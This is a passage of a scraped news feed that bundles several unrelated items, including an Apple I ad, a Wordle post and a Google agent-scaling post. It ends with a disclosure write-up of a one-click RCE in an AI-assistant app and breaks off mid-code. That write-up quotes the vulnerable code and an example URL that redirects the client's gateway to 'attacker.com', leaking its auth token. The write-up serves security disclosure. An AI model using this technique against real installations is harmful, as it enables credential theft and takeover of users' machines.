    &lt;p&gt; In: Adventure Related Talk &amp;amp; Chat&lt;lb/&gt; By: Danvzare (3 hours ago) &lt;/p&gt;
    &lt;p&gt; In: Beginners' Technical Questions&lt;lb/&gt; By: SilverSpook (4 hours ago) &lt;/p&gt;
    &lt;p&gt; In: AGS Games in Production&lt;lb/&gt; By: Rui "Giger Kitty" Pires (4 hours ago) &lt;/p&gt;
    &lt;p&gt;AGS has an active and friendly community, with many ways of keeping in touch and getting help with your project or games made with AGS.&lt;/p&gt;
    &lt;p&gt;These include our local forums, Facebook page, Discord server, in-person meet-ups, and many more.&lt;/p&gt;
    &lt;p&gt;The AGS community is run by a team of dedicated volunteers, who put their time and efforts into keeping it running as a welcoming, friendly and informative place to be. The AGS server and forums are paid for out of our own pockets, so in effect it costs us money to provide a free service to AGS users.&lt;/p&gt;
    &lt;p&gt;If you appreciate the work we do, and would like to give a little something back, please use the below link to donate via PayPal. Any profit made after covering server costs will be put back into hosting community events such as Mittens.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46846252</guid><pubDate>Sun, 01 Feb 2026 13:56:56 +0000</pubDate></item><item><title>English professors double down on requiring printed copies of readings</title><link>https://yaledailynews.com/articles/english-professors-double-down-on-requiring-printed-copies-of-readings</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46847039</guid><pubDate>Sun, 01 Feb 2026 15:58:23 +0000</pubDate></item><item><title>Aging muscle stem cells shift from rapid repair to long-term survival</title><link>https://phys.org/news/2026-01-sprint-marathon-aging-muscle-stem.html</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46847746</guid><pubDate>Sun, 01 Feb 2026 17:33:04 +0000</pubDate></item><item><title>Apple I Advertisement (1976)</title><link>http://apple1.chez.com/Apple1project/Gallery/Gallery.htm</link><description>&lt;doc fingerprint="b45ed919010701fc"&gt;
  &lt;main&gt;
    &lt;row&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt; The Apple Computer. A truly complete microcomputer system on a single PC board. Based on the MOS Technology 6502 micro- processor, the Apple also has a built-in video terminal and sockets for 8K bytes of onboard RAM memory. With the addition of a keyboard and video monitor, you'll have an extremely powerful computer system that can be used for anything from developing programs to playing games or running BASIC.&lt;lb/&gt; Combining the computer, video terminal and dynamic memory on a single board has resulted in a large reduction in chip count, which means more reliability and lowered cost. Since the Apple comes fully assembled, tested &amp;amp; burned-in and has a complete power supply on-board, initial set-up is essentially "hassle-free" and you can be running within minutes. At $666.66 (including 4K bytes RAM!) it opens many new possibilities for users and systems manufacturers.&lt;/p&gt;
        &lt;p&gt;You Don't Need an Expensive Teletype.&lt;lb/&gt; Using the built-in video terminal and keyboard interface, you avoid all the expense, noise and mantenance associated with a teletype. And the Apple video terminal is six times faster than a teletype, which means more throughput and less waiting. The Apple connects directly to a video monitor (or home TV with an in- expensive RF modulator) and dis- plays 960 easy to read characters in 24 rows of 40 characters per line with automatic scrolling. The video display section contains its own 1K bytes of memory, so all the RAM memory is available for user programs. And the &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;Keyboard Interface lets you use almost any ASCII-encoded keyboard.&lt;lb/&gt; The Apple Computer makes it possible for many people with limited budgets to step up to a video terminal as an I/O device for their computer.&lt;/p&gt;
        &lt;p&gt;No More Switches,&lt;lb/&gt; No MoreLights&lt;lb/&gt; Compared to switches and LED's, a video terminal can dis- play vast amounts of information simultaneously. The Apple video terminal can display the contents of 192 memory locations at once on the screen. And the fimrware in PROMS enables you to enter,display and debug programs (all in hex) from the keyboard, ren- dering a front panel unnecessary. The firmware also allows your programs to print characters on the display, and since you'll be looking at letters and numbers instead of just LED's, the door is open to all kinds of alphanumeric software (i.e., Games and BASIC).&lt;/p&gt;
        &lt;p&gt;8K Bytes RAM in 16 Chips!&lt;lb/&gt; The Apple Computer uses the new 16-pin 4K dynamic memory chips. They are faster and take 1/4 the space and power of even the low power 2102's (the memory chip that everyone else uses). That means 8K bytes in sixteen chips. It also means no more 28 amp power supplies. The system is fully expandable to 65K via an edge connector which carries both the address and data busses, power supplies and all timing signals. All dy- namic memory refreshing for both on and off-board memory is done automatically. Also, the Apple Computer can be upgraded to use the 16K chips when they become availa- &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell valign="TOP" width="210"&gt;
        &lt;p&gt;ble. That's 32K bytes on-board RAM in 16 IC's --the equivalent of 256 2102's!&lt;/p&gt;
        &lt;p&gt;A little Cassette Board that Works!&lt;lb/&gt; Unlike many other cassette boards on the marketplace,ours works every timeIt plugs directly into the upright connector on the mainboard and stands only 2" tall.And since it is very fast (1500 bits per second), you can read or write 4 K bytes in about 20 seconds.All timing is done in software, witch results in crystal-controlled accuracy and uniformity from unit to unit.&lt;lb/&gt; unlike some other cassette interfaces witch requires an expensive tape recorder, the Apple Cassette Interface works reliably with almost any audio-grade cassette recorder.&lt;/p&gt;
        &lt;p&gt;Softwares&lt;lb/&gt; A tape of APPLE BASIC is inclued free with the Cassette Interface.Apple Basic features immediate error message and fast execution, and let's you program in a highter level language immediately and without added cost.Also avialable now are a dis-assembler and many games, with many software packages,(including a macro assembler) in the works.And since our philosophy is to provide software for our machines free or at minimal cost, you won't be continually paying for access to this growing software library.&lt;lb/&gt; The Apple Computer is in stock al almost all major computer stores.(if your local computer store doesn't carry our products, encourage them or write us direct).Dealer inquiries invited. &lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46847780</guid><pubDate>Sun, 01 Feb 2026 17:36:57 +0000</pubDate></item><item><title>A Crisis comes to Wordle: Reusing old words</title><link>https://forkingmad.blog/wordle-crisis/</link><description>&lt;doc fingerprint="2a1d83a66f285f21"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;A Crisis comes to Wordle: Reusing old words!&lt;/head&gt;
    &lt;p&gt;A few days ago, The new York Times (owner of Wordle) announced that from 2 February it would start reusing some words from previous years.&lt;/p&gt;
    &lt;p&gt;Their announcement started:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Hey, Wordlers! We have some exciting news to share&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;and continued&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Starting on Monday, we will begin adding previously run words back into play. There are still many first-time answers to debut, but also more chances for Wordle in ones and those magical, serendipitous moments when Wordle overlaps with real life. Happy solving!&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Firstly, whoever wrote this nonsense deserves an award for fake cheerfulness. There is absolutely no "exciting news" in that paragraph.&lt;/p&gt;
    &lt;p&gt;It has caused a bit of a stir in the Wordle Community. Many wondering why, and some suggesting they will now stop playing the dumbed down version.&lt;/p&gt;
    &lt;head rend="h2"&gt;It got me thinking&lt;/head&gt;
    &lt;p&gt;Are they running out of five-letter words? I've gathered the data and crunched the numbers, and here are my findings:&lt;/p&gt;
    &lt;p&gt;Firstly, I started with a list of English words. I've actually had a list for some time, and I knew one day it would come in useful. It contains 466,547 words: from aahed 1 to zugzwang 2.&lt;/p&gt;
    &lt;p&gt;I then narrowed that down to five-letter words (22,949) before excluding plurals, which are not used in Wordle, and Proper Nouns (such as Paris, or March -- anything with uppercase first letter, but leaving "march" for example). The list was down to 10,784 words.&lt;/p&gt;
    &lt;p&gt;Finally, one more trip through the sausage machine. I put this list in a word processor and calculated how many spelling errors there were. This, roughly, would help me identify the more common five-letter words. I doubt many of us could use valew 3 in a sentence.&lt;/p&gt;
    &lt;p&gt;We now have a more manageable potential Wordle list of 5,437 words.&lt;/p&gt;
    &lt;head rend="h2"&gt;The longevity of five-thousand words?&lt;/head&gt;
    &lt;p&gt;A word-a-day from that list would yield almost 15 years of daily challenges. Wordle has been running since October 2021. By my reckoning we have enough to run until 2036&lt;/p&gt;
    &lt;head rend="h2"&gt;NYT, Why?&lt;/head&gt;
    &lt;p&gt;So that does beg the question: New York Times - why start repeating?&lt;/p&gt;
    &lt;p&gt;Leave a Comment; Or copy this post id and search for it in your Fediverse client to reply; Or send a message. If you have replied with your own blog post and I will mention it here.&lt;/p&gt;
    &lt;p&gt;https://gofer.social/@daj/statuses/01KGCRW6RR3XWCYYHBKW7YHKRJ&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46847924</guid><pubDate>Sun, 01 Feb 2026 17:54:55 +0000</pubDate></item><item><title>Towards a science of scaling agent systems: When and why agent systems work</title><link>https://research.google/blog/towards-a-science-of-scaling-agent-systems-when-and-why-agent-systems-work/</link><description>&lt;doc fingerprint="3479c6dba9c380b3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Towards a science of scaling agent systems: When and why agent systems work&lt;/head&gt;
    &lt;p&gt;January 28, 2026&lt;/p&gt;
    &lt;p&gt;Yubin Kim, Research Intern, and Xin Liu, Senior Research Scientist, Google Research&lt;/p&gt;
    &lt;p&gt;Through a controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for AI agent systems, revealing that multi-agent coordination dramatically improves performance on parallelizable tasks but degrades it on sequential ones; we also introduce a predictive model that identifies the optimal architecture for 87% of unseen tasks.&lt;/p&gt;
    &lt;head rend="h2"&gt;Quick links&lt;/head&gt;
    &lt;p&gt;AI agents — systems capable of reasoning, planning, and acting — are becoming a common paradigm for real-world AI applications. From coding assistants to personal health coaches, the industry is shifting from single-shot question answering to sustained, multi-step interactions. While researchers have long utilized established metrics to optimize the accuracy of traditional machine learning models, agents introduce a new layer of complexity. Unlike isolated predictions, agents must navigate sustained, multi-step interactions where a single error can cascade throughout a workflow. This shift compels us to look beyond standard accuracy and ask: How do we actually design these systems for optimal performance?&lt;/p&gt;
    &lt;p&gt;Practitioners often rely on heuristics, such as the assumption that "more agents are better", believing that adding specialized agents will consistently improve results. For example, "More Agents Is All You Need" reported that LLM performance scales with agent count, while collaborative scaling research found that multi-agent collaboration "...often surpasses each individual through collective reasoning."&lt;/p&gt;
    &lt;p&gt;In our new paper, “Towards a Science of Scaling Agent Systems”, we challenge this assumption. Through a large-scale controlled evaluation of 180 agent configurations, we derive the first quantitative scaling principles for agent systems, revealing that the "more agents" approach often hits a ceiling, and can even degrade performance if not aligned with the specific properties of the task.&lt;/p&gt;
    &lt;head rend="h2"&gt;Defining "agentic" evaluation&lt;/head&gt;
    &lt;p&gt;To understand how agents scale, we first defined what makes a task "agentic". Traditional static benchmarks measure a model's knowledge, but they don't capture the complexities of deployment. We argue that agentic tasks require three specific properties:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Sustained multi-step interactions with an external environment.&lt;/item&gt;
      &lt;item&gt;Iterative information gathering under partial observability.&lt;/item&gt;
      &lt;item&gt;Adaptive strategy refinement based on environmental feedback.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We evaluated five canonical architectures: one single-agent system (SAS) and four multi-agent variants (independent, centralized, decentralized, and hybrid) across four diverse benchmarks, including Finance-Agent (financial reasoning), BrowseComp-Plus (web navigation), PlanCraft (planning), and Workbench (tool use). The agent architectures are defined as follow:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Single-Agent (SAS): A solitary agent executing all reasoning and acting steps sequentially with a unified memory stream.&lt;/item&gt;
      &lt;item&gt;Independent: Multiple agents working in parallel on sub-tasks without communicating, aggregating results only at the end.&lt;/item&gt;
      &lt;item&gt;Centralized: A "hub-and-spoke" model where a central orchestrator delegates tasks to workers and synthesizes their outputs.&lt;/item&gt;
      &lt;item&gt;Decentralized: A peer-to-peer mesh where agents communicate directly with one another to share information and reach consensus.&lt;/item&gt;
      &lt;item&gt;Hybrid: A combination of hierarchical oversight and peer-to-peer coordination to balance central control with flexible execution.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Results: The myth of "more agents"&lt;/head&gt;
    &lt;p&gt;To quantify the impact of model capabilities on agent performance, we evaluated our architectures across three leading model families: OpenAI GPT, Google Gemini, and Anthropic Claude. The results reveal a complex relationship between model capabilities and coordination strategy. As shown in the figure below, while performance generally trends upward with more capable models, multi-agent systems are not a universal solution — they can either significantly boost or unexpectedly degrade performance depending on the specific configuration.&lt;/p&gt;
    &lt;p&gt;The results below compare the performance of the five architectures across different domains, such as web browsing and financial analysis. The box plots represent the accuracy distribution for each approach, while the percentages indicate the relative improvement (or decline) of multi-agent teams compared to the single-agent baseline. This data highlights that while adding agents can drive massive gains in parallelizable tasks, it can often lead to diminishing returns — or even performance drops — in more sequential workflows.&lt;/p&gt;
    &lt;head rend="h3"&gt;The alignment principle&lt;/head&gt;
    &lt;p&gt;On parallelizable tasks like financial reasoning (e.g., distinct agents can simultaneously analyze revenue trends, cost structures, and market comparisons), centralized coordination improved performance by 80.9% over a single agent. The ability to decompose complex problems into sub-tasks allowed agents to work more effectively.&lt;/p&gt;
    &lt;head rend="h3"&gt;The sequential penalty&lt;/head&gt;
    &lt;p&gt;Conversely, on tasks requiring strict sequential reasoning (like planning in PlanCraft), every multi-agent variant we tested degraded performance by 39-70%. In these scenarios, the overhead of communication fragmented the reasoning process, leaving insufficient "cognitive budget" for the actual task.&lt;/p&gt;
    &lt;head rend="h3"&gt;The tool-use bottleneck&lt;/head&gt;
    &lt;p&gt;We identified a "tool-coordination trade-off". As tasks require more tools (e.g., a coding agent with access to 16+ tools), the "tax" of coordinating multiple agents increases disproportionately.&lt;/p&gt;
    &lt;head rend="h2"&gt;Architecture as a safety feature&lt;/head&gt;
    &lt;p&gt;Perhaps most important for real-world deployment, we found a relationship between architecture and reliability. We measured error amplification, the rate at which a mistake by one agent propagates to the final result.&lt;/p&gt;
    &lt;p&gt;We found that independent multi-agent systems (agents working in parallel without talking) amplified errors by 17.2x. Without a mechanism to check each other's work, errors cascaded unchecked. Centralized systems (with an orchestrator) contained this amplification to just 4.4x. The orchestrator effectively acts as a "validation bottleneck", catching errors before they propagate.&lt;/p&gt;
    &lt;head rend="h2"&gt;A predictive model for agent design&lt;/head&gt;
    &lt;p&gt;Moving beyond retrospection, we developed a predictive model (R^2 = 0.513) that uses measurable task properties like tool count and decomposability to predict which architecture will perform best. This model correctly identifies the optimal coordination strategy for 87% of unseen task configurations.&lt;/p&gt;
    &lt;p&gt;This suggests we are moving toward a new science of agent scaling. Instead of guessing whether to use a swarm of agents or a single powerful model, developers can now look at the properties of their task, specifically its sequential dependencies and tool density, to make principled engineering decisions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;As foundational models like Gemini continue to advance, our research suggests that smarter models don't replace the need for multi-agent systems, they accelerate it, but only when the architecture is right. By moving from heuristics to quantitative principles, we can build the next generation of AI agents that are not just more numerous, but smarter, safer, and more efficient.&lt;/p&gt;
    &lt;head rend="h2"&gt;Acknowledgements&lt;/head&gt;
    &lt;p&gt;We would like to thank our co-authors and collaborators from Google Research, Google DeepMind, and academia for their contributions to this work.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46847958</guid><pubDate>Sun, 01 Feb 2026 18:00:30 +0000</pubDate></item><item><title>Clearspace (YC W23) Is Hiring an Applied Researcher (ML)</title><link>https://www.ycombinator.com/companies/clearspace/jobs/GOWiDwp-research-engineer-at-clearspace</link><description>&lt;doc fingerprint="14939967bc01edd1"&gt;
  &lt;main&gt;
    &lt;p&gt;Eliminate compulsive phone usage&lt;/p&gt;
    &lt;p&gt;About Clearspace&lt;/p&gt;
    &lt;p&gt;Clearspace is building the intentionality layer of the internet. Our mission is to build technology as effective at protecting human attention as social media is at exploiting it (infinite scrolling, short-form feeds, manipulative notifications, etc). Our category defining mobile app has been featured on Huberman Lab, New York Times Wirecutter, NPR Marketplace, Forbes, TBPN.&lt;/p&gt;
    &lt;p&gt;People that want a better relationship with their devices have nowhere to turn except for willpower. We are building an agent that achieves this on all devices by processing and filtering network traffic based on natural language rules.&lt;/p&gt;
    &lt;p&gt;About The Role&lt;/p&gt;
    &lt;p&gt;We are looking for an ML-focused engineer that will be responsible for training and improving a model for classifying network traffic. You are great for this role if you are not only excited about the latest in AI and ML but are also a problem-solver in the data domain. You don’t just think about the model but “how can we get more data volume”; “how can we featurize the data intelligently”; “what are our data needs based on our task and desired model size”, and like building backwards from inference requirements.&lt;/p&gt;
    &lt;p&gt;Responsibilities&lt;/p&gt;
    &lt;p&gt;Qualifications&lt;/p&gt;
    &lt;p&gt;Nice to Have&lt;/p&gt;
    &lt;p&gt;At Clearspace we help people reduce compulsive phone usage.&lt;/p&gt;
    &lt;p&gt;We exist to protect people's attention from the exploits of modern technology platforms and make space for the things that matter to them most.&lt;/p&gt;
    &lt;p&gt;We believe the technology to protect someones attention should be just as sophisticated and effective as the tech that is exploiting it and are building a world-class engineering team to arm the world with a comprehensive attention protection stack.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46848260</guid><pubDate>Sun, 01 Feb 2026 18:41:54 +0000</pubDate></item><item><title>I taught my neighbor to keep the volume down</title><link>https://idiallo.com/blog/teaching-my-neighbor-to-keep-the-volume-down</link><description>&lt;doc fingerprint="2728920ef029d7c1"&gt;
  &lt;main&gt;
    &lt;p&gt;When I moved to a new apartment with my family, the cable company we were used to wasn't available. We had to settle for Dish Network. I wasn't too happy about making that switch, but something on their website caught my attention. For an additional $5 a month, I could have access to DVR. I switched immediately.&lt;/p&gt;
    &lt;p&gt;This was 2007. DVR was not new, but it wasn't commonly bundled with set-top boxes. TiVo was still the popular way to record, pause, and rewind live TV. We received two set-top boxes, one for each room with a TV, and three remotes. Two remotes had IR (infrared) blasters and, surprisingly, one RF (radio frequency) remote.&lt;/p&gt;
    &lt;p&gt;After using the RF remote, I wondered: Why would anyone ever use an IR remote again? You didn't need a direct line of sight with the device you were controlling. I could actually stand in the kitchen and control the TV. It was amazing. But with the convenience of RF came other problems that IR users never had to worry about. Interference.&lt;/p&gt;
    &lt;p&gt;After several months of enjoying my service, one of my neighbors, the loudest in the building, also switched to Dish Network. And he also got the RF remote. This was the type of neighbor who would leave the house with the TV on, volume blasting.&lt;/p&gt;
    &lt;p&gt;One day, I was in the living room watching TV when the channel just flipped. I must have accidentally hit a button, so I changed it back. But not a few seconds later, the channel changed again. Then the volume went up. I figured my sister must have had the RF remote and was messing with me. But no, the remote was in my hand. I assumed something was wrong with it.&lt;/p&gt;
    &lt;p&gt;The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.&lt;/p&gt;
    &lt;p&gt;One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled.&lt;/p&gt;
    &lt;p&gt;I am the captain now.&lt;/p&gt;
    &lt;p&gt;Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.&lt;/p&gt;
    &lt;p&gt;But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.&lt;/p&gt;
    &lt;p&gt;In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened.&lt;/p&gt;
    &lt;p&gt;"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.&lt;/p&gt;
    &lt;p&gt;The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand.&lt;/p&gt;
    &lt;p&gt;Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.&lt;/p&gt;
    &lt;p&gt;One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.&lt;/p&gt;
    &lt;p&gt;Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.&lt;/p&gt;
    &lt;p&gt;Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46848415</guid><pubDate>Sun, 01 Feb 2026 19:00:46 +0000</pubDate></item><item><title>TIL: Apple Broke Time Machine Again on Tahoe</title><link>https://taoofmac.com/space/til/2026/02/01/1630</link><description>&lt;doc fingerprint="ffd1c13f5c3021f6"&gt;
  &lt;main&gt;
    &lt;p&gt;So… Here we are again.&lt;/p&gt;
    &lt;p&gt;Today, after a minor disaster with my Obsidian vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a Synology NAS as Time Machine target, exporting the share over SMB and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.&lt;/p&gt;
    &lt;p&gt;After some research, I found out that the issue is with Apple’s unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Seems To Be Working Now&lt;/head&gt;
    &lt;p&gt;I found this gist, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the &lt;code&gt;nsmb.conf&lt;/code&gt; file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.&lt;/p&gt;
    &lt;code&gt;sudo nano /etc/nsmb.conf # I used vim, of course
&lt;/code&gt;
    &lt;p&gt;…and adding the following lines (the file should be empty):&lt;/p&gt;
    &lt;code&gt;[default]
signing_required=yes
streams=yes
soft=yes
dir_cache_max_cnt=0
protocol_vers_map=6
mc_prefer_wired=yes
&lt;/code&gt;
    &lt;p&gt;The explanation here is that macOS Tahoe changed the default from &lt;code&gt;signing_required=no&lt;/code&gt; to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.&lt;/p&gt;
    &lt;p&gt;Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the &lt;code&gt;.sparsebundle&lt;/code&gt; name (that wasn’t an issue for me, but YMMV).&lt;/p&gt;
    &lt;p&gt;On the Synology side, the recommendation was to go to &lt;code&gt;Control Panel &amp;gt; File Services &amp;gt; SMB &amp;gt; Advanced&lt;/code&gt; and set:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maximum SMB protocol: SMB3&lt;/item&gt;
      &lt;item&gt;Enable Opportunistic Locking: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB2 Lease: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB Durable Handles: Yes&lt;/item&gt;
      &lt;item&gt;Server signing: No (or “Auto”)&lt;/item&gt;
      &lt;item&gt;Transport encryption: Disabled&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:&lt;/p&gt;
    &lt;head rend="h2"&gt;My Backup Backup Plan&lt;/head&gt;
    &lt;p&gt;Since I’m tired of Apple breaking Time Machine every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.&lt;/p&gt;
    &lt;p&gt;I already have a Proxmox server with ZFS as the backend storage that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.&lt;/p&gt;
    &lt;p&gt;As it happens, &lt;code&gt;mbentley/timemachine&lt;/code&gt; is a Docker image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:&lt;/p&gt;
    &lt;code&gt;services:
  timemachine:
    image: mbentley/timemachine:smb
    container_name: timemachine
    restart: always
    network_mode: host
    environment:
      - TM_USERNAME=timemachine
      - TM_GROUPNAME=timemachine
      - PASSWORD=timemachine
      - TM_UID=65534 # 'nobody' user
      - TM_GID=65534 # 'nobody' group
      - SET_PERMISSIONS=false
      - VOLUME_SIZE_LIMIT=0
    volumes:
      # this is a pass-though mountpoint to the ZFS volume in Proxmox
      - /mnt/shares/timemachine:/opt/timemachine
    tmpfs:
      - /run/samba
&lt;/code&gt;
    &lt;p&gt;Right now the first option seems to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the SMB implementation and avoids relying on Synology’s software.&lt;/p&gt;
    &lt;p&gt;But if anyone from Apple is reading this: please, stop breaking Time Machine every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.&lt;/p&gt;
    &lt;p&gt;Plus I’m annoyed enough that earlier this morning I tried to set up a new iOS device and the infamous &lt;code&gt;Restore in Progress: An estimated 100 MB will be downloaded…&lt;/code&gt; bug (which has bitten me repeatedly over the last six years) is still there.&lt;/p&gt;
    &lt;p&gt;The usual fix was hitting &lt;code&gt;Reset Network Settings&lt;/code&gt; and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took three attempts.&lt;/p&gt;
    &lt;p&gt;Come on, Apple, get your act together. Hire people who care about the OS experience, not just Liquid Glass.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46848699</guid><pubDate>Sun, 01 Feb 2026 19:38:45 +0000</pubDate></item><item><title>1-Click RCE to steal your Moltbot data and keys</title><link>https://depthfirst.com/post/1-click-rce-to-steal-your-moltbot-data-and-keys</link><description>&lt;doc fingerprint="eaa40de3c2baaa9"&gt;
  &lt;main&gt;&lt;p&gt;February 1, 2026&lt;/p&gt;&lt;p&gt;OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.&lt;/p&gt;&lt;p&gt;I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.&lt;/p&gt;&lt;p&gt;Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.&lt;/p&gt;&lt;p&gt;Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap:&lt;/p&gt;&lt;p&gt;1. Ingestion: &lt;code&gt;app-settings.ts&lt;/code&gt; blindly accepts a &lt;code&gt;gatewayUrl&lt;/code&gt; query parameter in the URL and persists it to storage. For example, &lt;code&gt;https://localhost?gatewayUrl=attacker.com&lt;/code&gt; would save &lt;code&gt;attacker.com&lt;/code&gt; as the new gateway url.&lt;/p&gt;&lt;code&gt;const gatewayUrlRaw = params.get("gatewayUrl");
...
if (gatewayUrlRaw != null) {
  const gatewayUrl = gatewayUrlRaw.trim();
  if (gatewayUrl &amp;amp;&amp;amp; gatewayUrl !== host.settings.gatewayUrl) {
    applySettings(host, { ...host.settings, gatewayUrl }); // persisted via saveSettings -&amp;gt; localStorage
  }
}
&lt;/code&gt;&lt;p&gt;2. Processing: &lt;code&gt;app-lifecycle.ts&lt;/code&gt; triggers &lt;code&gt;connectGateway()&lt;/code&gt; immediately after settings (such as the gateway url) are applied.&lt;/p&gt;&lt;code&gt;handleConnected(host) {
  ...
  connectGateway(host); // runs immediately on load after parsing URL params
  startNodesPolling(host);
  ...
}&lt;/code&gt;&lt;p&gt;3. Protocol Execution: gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.&lt;/p&gt;&lt;code&gt;const params = { ... , authToken, locale: navigator.language };
